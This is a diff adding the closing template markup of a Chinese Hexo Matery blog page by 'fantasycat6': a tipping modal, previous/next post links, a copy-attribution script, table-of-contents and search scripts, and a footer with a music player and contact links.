+    <div class="social-share" data-sites="twitter,facebook,google,qq,qzone,wechat,weibo,douban,linkedin" data-wechat-qrcode-helper="<p>微信扫一扫即可分享！</p>"></div>
+    <script src="../../../../../../../libs/share/js/social-share.min.js"></script>
+    
+
+    
+
+</div>
+
+                </div>
+            </div>
+            
+                <style>
+    #reward {
+        margin: 40px 0;
+        text-align: center;
+    }
+
+    #reward .reward-link {
+        font-size: 1.4rem;
+        line-height: 38px;
+    }
+
+    #reward .btn-floating:hover {
+        box-shadow: 0 6px 12px rgba(0, 0, 0, 0.2), 0 5px 15px rgba(0, 0, 0, 0.2);
+    }
+
+    #rewardModal {
+        width: 320px;
+        height: 350px;
+    }
+
+    #rewardModal .reward-title {
+        margin: 15px auto;
+        padding-bottom: 5px;
+    }
+
+    #rewardModal .modal-content {
+        padding: 10px;
+    }
+
+    #rewardModal .close {
+        position: absolute;
+        right: 15px;
+        top: 15px;
+        color: rgba(0, 0, 0, 0.5);
+        font-size: 1.3rem;
+        line-height: 20px;
+        cursor: pointer;
+    }
+
+    #rewardModal .close:hover {
+        color: #ef5350;
+        transform: scale(1.3);
+        -moz-transform:scale(1.3);
+        -webkit-transform:scale(1.3);
+        -o-transform:scale(1.3);
+    }
+
+    #rewardModal .reward-tabs {
+        margin: 0 auto;
+        width: 210px;
+    }
+
+    .reward-tabs .tabs {
+        height: 38px;
+        margin: 10px auto;
+        padding-left: 0;
+    }
+
+    .reward-content ul {
+        padding-left: 0 !important;
+    }
+
+    .reward-tabs .tabs .tab {
+        height: 38px;
+        line-height: 38px;
+    }
+
+    .reward-tabs .tab a {
+        color: #fff;
+        background-color: #ccc;
+    }
+
+    .reward-tabs .tab a:hover {
+        background-color: #ccc;
+        color: #fff;
+    }
+
+    .reward-tabs .wechat-tab .active {
+        color: #fff !important;
+        background-color: #22AB38 !important;
+    }
+
+    .reward-tabs .alipay-tab .active {
+        color: #fff !important;
+        background-color: #019FE8 !important;
+    }
+
+    .reward-tabs .reward-img {
+        width: 210px;
+        height: 210px;
+    }
+</style>
+
+<div id="reward">
+    <a href="#rewardModal" class="reward-link modal-trigger btn-floating btn-medium waves-effect waves-light red">赏</a>
+
+    <!-- Modal Structure -->
+    <div id="rewardModal" class="modal">
+        <div class="modal-content">
+            <a class="close modal-close"><i class="fas fa-times"></i></a>
+            <h4 class="reward-title">你的赏识是我前进的动力</h4>
+            <div class="reward-content">
+                <div class="reward-tabs">
+                    <ul class="tabs row">
+                        <li class="tab col s6 alipay-tab waves-effect waves-light"><a href="#alipay">支付宝</a></li>
+                        <li class="tab col s6 wechat-tab waves-effect waves-light"><a href="#wechat">微 信</a></li>
+                    </ul>
+                    <div id="alipay">
+                        <img src="../../../../../../../medias/reward/alipay.jpg" class="reward-img" alt="支付宝打赏二维码">
+                    </div>
+                    <div id="wechat">
+                        <img src="../../../../../../../medias/reward/wechat.png" class="reward-img" alt="微信打赏二维码">
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+<script>
+    $(function () {
+        $('.tabs').tabs();
+    });
+</script>
+
+            
+        </div>
+    </div>
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+<article id="prenext-posts" class="prev-next articles">
+    <div class="row article-row">
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge left-badge text-color">
+                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+            <div class="card">
+                <a href="../1.33-jin-cheng-ling-lei-wei-suo-da-fa-yi/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="../../../../../../../medias/featureimages/0.jpg" class="responsive-img" alt="">
+                        
+                        <span class="card-title"></span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            
+                        
+                    </div>
+                    <div class="publish-info">
+                        <span class="publish-date">
+                            <i class="far fa-clock fa-fw icon-date"></i>2023-07-16
+                        </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-user fa-fw"></i>
+                            fantasycat6
+                            
+                        </span>
+                    </div>
+                </div>
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
+            </div>
+            <div class="card">
+                <a href="../1.32-luan-quan-ye-da-bu-si-lao-shi-fu-er/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="../../../../../../../medias/featureimages/0.jpg" class="responsive-img" alt="">
+                        
+                        <span class="card-title"></span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2023-07-16
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-user fa-fw"></i>
+                            fantasycat6
+                            
+                        </span>
+                    </div>
+                </div>
+                
+            </div>
+        </div>
+        
+    </div>
+</article>
+
+</div>
+
+
+<script>
+    $('#articleContent').on('copy', function (e) {
+        // IE8 or earlier browser is 'undefined'
+        if (typeof window.getSelection === 'undefined') return;
+
+        var selection = window.getSelection();
+        // if the selection is short let's not annoy our users.
+        if (('' + selection).length < Number.parseInt('120')) {
+            return;
+        }
+
+        // create a div outside of the visible area and fill it with the selected text.
+        var bodyElement = document.getElementsByTagName('body')[0];
+        var newdiv = document.createElement('div');
+        newdiv.style.position = 'absolute';
+        newdiv.style.left = '-99999px';
+        bodyElement.appendChild(newdiv);
+        newdiv.appendChild(selection.getRangeAt(0).cloneContents());
+
+        // we need a <pre> tag workaround.
+        // otherwise the text inside "pre" loses all the line breaks!
+        if (selection.getRangeAt(0).commonAncestorContainer.nodeName === 'PRE') {
+            newdiv.innerHTML = "<pre>" + newdiv.innerHTML + "</pre>";
+        }
+
+        var url = document.location.href;
+        newdiv.innerHTML += '<br />'
+            + '来源: Hexo<br />'
+            + '文章作者: fantasycat6<br />'
+            + '文章链接: <a href="' + url + '">' + url + '</a><br />'
+            + '本文章著作权归作者所有，任何形式的转载都请注明出处。';
+
+        selection.selectAllChildren(newdiv);
+        window.setTimeout(function () {bodyElement.removeChild(newdiv);}, 200);
+    });
+</script>
+
+
+<!-- 代码块功能依赖 -->
+<script type="text/javascript" src="../../../../../../../libs/codeBlock/codeBlockFuction.js"></script>
+
+<!-- 代码语言 -->
+
+<script type="text/javascript" src="../../../../../../../libs/codeBlock/codeLang.js"></script>
+
+
+<!-- 代码块复制 -->
+
+<script type="text/javascript" src="../../../../../../../libs/codeBlock/codeCopy.js"></script>
+
+
+<!-- 代码块收缩 -->
+
+<script type="text/javascript" src="../../../../../../../libs/codeBlock/codeShrink.js"></script>
+
+
+    </div>
+    <div id="toc-aside" class="expanded col l3 hide-on-med-and-down">
+        <div class="toc-widget card" style="background-color: white;">
+            <div class="toc-title"><i class="far fa-list-alt"></i>&nbsp;&nbsp;目录</div>
+            <div id="toc-content"></div>
+        </div>
+    </div>
+</div>
+
+<!-- TOC 悬浮按钮. -->
+
+<div id="floating-toc-btn" class="hide-on-med-and-down">
+    <a class="btn-floating btn-large bg-color">
+        <i class="fas fa-list-ul"></i>
+    </a>
+</div>
+
+
+<script src="../../../../../../../libs/tocbot/tocbot.min.js"></script>
+<script>
+    $(function () {
+        tocbot.init({
+            tocSelector: '#toc-content',
+            contentSelector: '#articleContent',
+            headingsOffset: -($(window).height() * 0.4 - 45),
+            collapseDepth: Number('0'),
+            headingSelector: 'h2, h3, h4'
+        });
+
+        // modify the toc link href to support Chinese.
+        let i = 0;
+        let tocHeading = 'toc-heading-';
+        $('#toc-content a').each(function () {
+            $(this).attr('href', '#' + tocHeading + (++i));
+        });
+
+        // modify the heading title id to support Chinese.
+        i = 0;
+        $('#articleContent').children('h2, h3, h4').each(function () {
+            $(this).attr('id', tocHeading + (++i));
+        });
+
+        // Set scroll toc fixed.
+        let tocHeight = parseInt($(window).height() * 0.4 - 64);
+        let $tocWidget = $('.toc-widget');
+        $(window).scroll(function () {
+            let scroll = $(window).scrollTop();
+            /* add post toc fixed. */
+            if (scroll > tocHeight) {
+                $tocWidget.addClass('toc-fixed');
+            } else {
+                $tocWidget.removeClass('toc-fixed');
+            }
+        });
+
+        
+        /* 修复文章卡片 div 的宽度. */
+        let fixPostCardWidth = function (srcId, targetId) {
+            let srcDiv = $('#' + srcId);
+            if (srcDiv.length === 0) {
+                return;
+            }
+
+            let w = srcDiv.width();
+            if (w >= 450) {
+                w = w + 21;
+            } else if (w >= 350 && w < 450) {
+                w = w + 18;
+            } else if (w >= 300 && w < 350) {
+                w = w + 16;
+            } else {
+                w = w + 14;
+            }
+            $('#' + targetId).width(w);
+        };
+
+        // 切换TOC目录展开收缩的相关操作.
+        const expandedClass = 'expanded';
+        let $tocAside = $('#toc-aside');
+        let $mainContent = $('#main-content');
+        $('#floating-toc-btn .btn-floating').click(function () {
+            if ($tocAside.hasClass(expandedClass)) {
+                $tocAside.removeClass(expandedClass).hide();
+                $mainContent.removeClass('l9');
+            } else {
+                $tocAside.addClass(expandedClass).show();
+                $mainContent.addClass('l9');
+            }
+            fixPostCardWidth('artDetail', 'prenext-posts');
+        });
+        
+    });
+</script>
+
+    
+
+</main>
+
+
+
+
+    <footer class="page-footer bg-color">
+    
+        <link rel="stylesheet" href="../../../../../../../libs/aplayer/APlayer.min.css">
+<style>
+    .aplayer .aplayer-lrc p {
+        
+        display: none;
+        
+        font-size: 12px;
+        font-weight: 700;
+        line-height: 16px !important;
+    }
+
+    .aplayer .aplayer-lrc p.aplayer-lrc-current {
+        
+        display: none;
+        
+        font-size: 15px;
+        color: #42b983;
+    }
+
+    
+    .aplayer.aplayer-fixed.aplayer-narrow .aplayer-body {
+        left: -66px !important;
+    }
+
+    .aplayer.aplayer-fixed.aplayer-narrow .aplayer-body:hover {
+        left: 0px !important;
+    }
+
+    
+</style>
+<div class="">
+    
+    <div class="row">
+        <meting-js class="col l8 offset-l2 m10 offset-m1 s12"
+                   server="netease"
+                   type="playlist"
+                   id="7788095093"
+                   fixed='true'
+                   autoplay='true'
+                   theme='#42b983'
+                   loop='all'
+                   order='random'
+                   preload='auto'
+                   volume='0.7'
+                   list-folded='true'
+        >
+        </meting-js>
+    </div>
+</div>
+
+<script src="../../../../../../../libs/aplayer/APlayer.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/meting@2/dist/Meting.min.js"></script>
+
+    
+    <div class="container row center-align" style="margin-bottom: 0px !important;">
+        <div class="col s12 m8 l8 copy-right">
+            Copyright&nbsp;&copy;
+            
+                <span id="year">2022-2023</span>
+            
+            <span id="year">2022</span>
+            <a href="../../../../../../../about" target="_blank">fantasycat6</a>
+            |&nbsp;Powered by&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>
+            |&nbsp;Theme&nbsp;<a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">Matery</a>
+            <br>
+            
+            &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
+                class="white-color">312.9k</span>&nbsp;字
+            
+            
+            
+            
+            
+            
+            <span id="busuanzi_container_site_pv">
+                |&nbsp;<i class="far fa-eye"></i>&nbsp;总访问量:&nbsp;<span id="busuanzi_value_site_pv"
+                    class="white-color"></span>&nbsp;次
+            </span>
+            
+            
+            <span id="busuanzi_container_site_uv">
+                |&nbsp;<i class="fas fa-users"></i>&nbsp;总访问人数:&nbsp;<span id="busuanzi_value_site_uv"
+                    class="white-color"></span>&nbsp;人
+            </span>
+            
+            <br>
+            
+            <br>
+            
+        </div>
+        <div class="col s12 m4 l4 social-link social-statis">
+    <a href="https://github.com/fantasycat6" class="tooltipped" target="_blank" data-tooltip="访问我的GitHub" data-position="top" data-delay="50">
+        <i class="fab fa-github"></i>
+    </a>
+
+
+
+    <a href="mailto:1745272762@qq.com" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
+        <i class="fas fa-envelope-open"></i>
+    </a>
+
+
+
+
+
+
+
+    <a href="tencent://AddContact/?fromId=50&fromSubId=1&subcmd=all&uin=1745272762" class="tooltipped" target="_blank" data-tooltip="QQ联系我: 1745272762" data-position="top" data-delay="50">
+        <i class="fab fa-qq"></i>
+    </a>
+
+
+
+
+
+
+
+    <a href="../../../../../../../atom.xml" class="tooltipped" target="_blank" data-tooltip="RSS 订阅" data-position="top" data-delay="50">
+        <i class="fas fa-rss"></i>
+    </a>
+
+</div>
+    </div>
+</footer>
+
+<div class="progress-bar"></div>
+
+
+    <!-- 搜索遮罩框 -->
+<div id="searchModal" class="modal">
+    <div class="modal-content">
+        <div class="search-header">
+            <span class="title"><i class="fas fa-search"></i>&nbsp;&nbsp;搜索</span>
+            <input type="search" id="searchInput" name="s" placeholder="请输入搜索的关键字"
+                   class="search-input">
+        </div>
+        <div id="searchResult"></div>
+    </div>
+</div>
+
+<script type="text/javascript">
+$(function () {
+    var searchFunc = function (path, search_id, content_id) {
+        'use strict';
+        $.ajax({
+            url: path,
+            dataType: "xml",
+            success: function (xmlResponse) {
+                // get the contents from search data
+                var datas = $("entry", xmlResponse).map(function () {
+                    return {
+                        title: $("title", this).text(),
+                        content: $("content", this).text(),
+                        url: $("url", this).text()
+                    };
+                }).get();
+                var $input = document.getElementById(search_id);
+                var $resultContent = document.getElementById(content_id);
+                $input.addEventListener('input', function () {
+                    var str = '<ul class=\"search-result-list\">';
+                    var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+                    $resultContent.innerHTML = "";
+                    if (this.value.trim().length <= 0) {
+                        return;
+                    }
+                    // perform local searching
+                    datas.forEach(function (data) {
+                        var isMatch = true;
+                        var data_title = data.title.trim().toLowerCase();
+                        var data_content = data.content.trim().replace(/<[^>]+>/g, "").toLowerCase();
+                        var data_url = data.url;
+                        data_url = data_url.indexOf('/') === 0 ? data.url : '/' + data_url;
+                        var index_title = -1;
+                        var index_content = -1;
+                        var first_occur = -1;
+                        // only match artiles with not empty titles and contents
+                        if (data_title !== '' && data_content !== '') {
+                            keywords.forEach(function (keyword, i) {
+                                index_title = data_title.indexOf(keyword);
+                                index_content = data_content.indexOf(keyword);
+                                if (index_title < 0 && index_content < 0) {
+                                    isMatch = false;
+                                } else {
+                                    if (index_content < 0) {
+                                        index_content = 0;
+                                    }
+                                    if (i === 0) {
+                                        first_occur = index_content;
+                                    }
+                                }
+                            });
+                        }
+                        // show search results
+                        if (isMatch) {
+                            str += "<li><a href='" + data_url + "' class='search-result-title'>" + data_title + "</a>";
+                            var content = data.content.trim().replace(/<[^>]+>/g, "");
+                            if (first_occur >= 0) {
+                                // cut out 100 characters
+                                var start = first_occur - 20;
+                                var end = first_occur + 80;
+                                if (start < 0) {
+                                    start = 0;
+                                }
+                                if (start === 0) {
+                                    end = 100;
+                                }
+                                if (end > content.length) {
+                                    end = content.length;
+                                }
+                                var match_content = content.substr(start, end);
+                                // highlight all keywords
+                                keywords.forEach(function (keyword) {
+                                    var regS = new RegExp(keyword, "gi");
+                                    match_content = match_content.replace(regS, "<em class=\"search-keyword\">" + keyword + "</em>");
+                                });
+
+                                str += "<p class=\"search-result\">" + match_content + "...</p>"
+                            }
+                            str += "</li>";
+                        }
+                    });
+                    str += "</ul>";
+                    $resultContent.innerHTML = str;
+                });
+            }
+        });
+    };
+
+    searchFunc('../../../../../../../search.xml', 'searchInput', 'searchResult');
+});
+</script>
+
+    <!-- 回到顶部按钮 -->
+<div id="backTop" class="top-scroll">
+    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
+        <i class="fas fa-arrow-up"></i>
+    </a>
+</div>
+
+
+    <script src="../../../../../../../libs/materialize/materialize.min.js"></script>
+    <script src="../../../../../../../libs/masonry/masonry.pkgd.min.js"></script>
+    <script src="../../../../../../../libs/aos/aos.js"></script>
+    <script src="../../../../../../../libs/scrollprogress/scrollProgress.min.js"></script>
+    <script src="../../../../../../../libs/lightGallery/js/lightgallery-all.min.js"></script>
+    <script src="../../../../../../../js/matery.js"></script>
+
+    <!-- Baidu Analytics -->
+
+    <!-- Baidu Push -->
+
+<script>
+    (function () {
+        var bp = document.createElement('script');
+        var curProtocol = window.location.protocol.split(':')[0];
+        if (curProtocol === 'https') {
+            bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+        } else {
+            bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+        }
+        var s = document.getElementsByTagName("script")[0];
+        s.parentNode.insertBefore(bp, s);
+    })();
+</script>
+
+    
+    <script src="../../../../../../../libs/others/clicklove.js" async="async"></script>
+    
+    
+    <script async src="../../../../../../../libs/others/busuanzi.pure.mini.js"></script>
+    
+
+    
+
+    
+
+	
+    
+
+    
+
+    
+
+    
+    <script src="../../../../../../../libs/instantpage/instantpage.js" type="module"></script>
+    
+
+</body>
+
+</html>
